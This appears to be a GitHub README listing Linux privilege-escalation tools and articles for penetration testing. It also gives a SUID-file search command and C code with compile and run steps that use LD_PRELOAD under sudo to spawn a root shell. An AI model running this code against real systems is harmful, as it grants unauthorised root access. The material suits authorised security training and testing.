# Privilege-Escalation
Bypass security restrictions in misconfigured systems.
List of Tools and Repositories 👇🏻

## For Linux

**LinPeas** - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

**LinEnum** - https://github.com/rebootuser/LinEnum

**LES (Linux Exploit Suggester)** - https://github.com/mzet-/linux-exploit-suggester

**Linux Smart Enumeration** - https://github.com/diego-treitos/linux-smart-enumeration

**Linux Priv Checker** - https://github.com/linted/linuxprivchecker 

**GTFOBins** - https://gtfobins.github.io/ ⭐

**To list all the files which have SUID and SGID bits set**
```
find / -type f -perm -04000 -ls 2>/dev/null
```

**Using *LD_Preload***
> This piece of code will spawn root shell ➡️ [shell.c](https://github.com/Somchandra17/Privilege-Escalation/blob/01f889492ff51414fa077a01fa538ecd5a0d4543/shell.c)
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
> Compile it using GCC into a Shared Object file(.so)
```
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```
> Run it by using LD_Preload option  
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
**Linux Privilege Escalation exploiting Sudo Rights — Part I** - https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d

**Abusing 'find', 'vim' and 'awk' for root access** - https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
